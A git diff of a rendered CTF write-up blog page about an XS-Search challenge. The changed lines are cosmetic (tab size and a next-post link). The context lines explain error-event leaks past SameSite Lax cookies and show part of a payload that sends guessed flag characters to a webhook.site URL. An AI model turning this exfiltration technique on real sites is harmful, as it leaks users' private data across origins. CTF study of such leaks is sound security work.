@@ -272,9 +272,9 @@ Link tags and Error events .
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
 <p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
-<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
+<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -295,7 +295,7 @@ Link tags and Error events .
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#5af78e">&#39;/search&#39;</span>, (req, res) =&gt; {
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#5af78e">&#39;/search&#39;</span>, (req, res) =&gt; {
 </span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">if</span> (req.cookies[<span style="color:#5af78e">&#39;admin_cookie&#39;</span>] <span style="color:#ff6ac1">!==</span> secretvalue) {
 </span></span><span style="display:flex;"><span>		res.status(<span style="color:#ff9f43">403</span>).send(<span style="color:#5af78e">&#34;Unauthorized&#34;</span>);
 </span></span><span style="display:flex;"><span>		<span style="color:#ff6ac1">return</span>;
@@ -322,9 +322,9 @@ Link tags and Error events .
 <p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
 <p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
 <p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
-<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
+<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
@@ -334,7 +334,7 @@ Link tags and Error events .
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> cookie <span style="color:#ff6ac1">=</span> {
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> cookie <span style="color:#ff6ac1">=</span> {
 </span></span><span style="display:flex;"><span>                domain<span style="color:#ff6ac1">:</span> domain,
 </span></span><span style="display:flex;"><span>                name<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#34;admin_cookie&#34;</span>,
 </span></span><span style="display:flex;"><span>                value<span style="color:#ff6ac1">:</span> key,
@@ -352,9 +352,9 @@ Link tags and Error events .
 .
 We can use a script,link tags to determine if it was <strong>200</strong> or <strong>404</strong> .Because if the response is <strong>200</strong> the <strong>onload</strong> event handler will be fired and if the response is <strong>404</strong> the <strong>onerror</strong> handler will be fired .</p>
 <h2 id="-final-payloads">🚀 Final Payloads</h2>
-<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
+<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
@@ -377,7 +377,7 @@ We can use a script,link tags to determine if it was <strong>200</strong> or <st
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> charset <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> charset <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff5c57">let</span> found <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;actf&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> leak_url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>
 </span></span><span style="display:flex;"><span>
@@ -408,9 +408,9 @@ We can use a script,link tags to determine if it was <strong>200</strong> or <st
 <p>So we can&rsquo;t use script,link stylesheets etc for leaking as there will be a <strong>content-type mismatch</strong> for the request resource.</p>
 <p>The intended solution was to use <strong>Complicated CSS effects</strong> and <strong>:visited selector</strong> to leak browser history through <strong>paint timing</strong> .It was a <a href="https://issues.chromium.org/issues/40091173">chromium bug</a> which was marked as won&rsquo;t fix .</p>
 <p>This was the exploit for it shared by <a href="https://x.com/ixSly">@ixSly</a>.</p>
-<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
+<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
@@ -674,7 +674,7 @@ We can use a script,link tags to determine if it was <strong>200</strong> or <st
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">262
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
+<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
 </span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> flask <span style="color:#ff6ac1">import</span> Flask, render_template_string, request
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>app <span style="color:#ff6ac1">=</span> Flask(__name__)
@@ -1030,6 +1030,10 @@ We can use a script,link tags to determine if it was <strong>200</strong> or <st
               <a href="https://Alfinj0se.github.io/posts/paaad-hackluctf2023/" data-toggle="tooltip" data-placement="top" title="päääd - Hack.lu CTF 2023 ">&larr; Previous Post</a>
             </li>
           
+          
+            <li class="next">
+              <a href="https://Alfinj0se.github.io/posts/kitctf2024/" data-toggle="tooltip" data-placement="top" title="Flag Remover - KitCTF 2024">Next Post &rarr;</a>
+            </li>
           
         </ul>
       
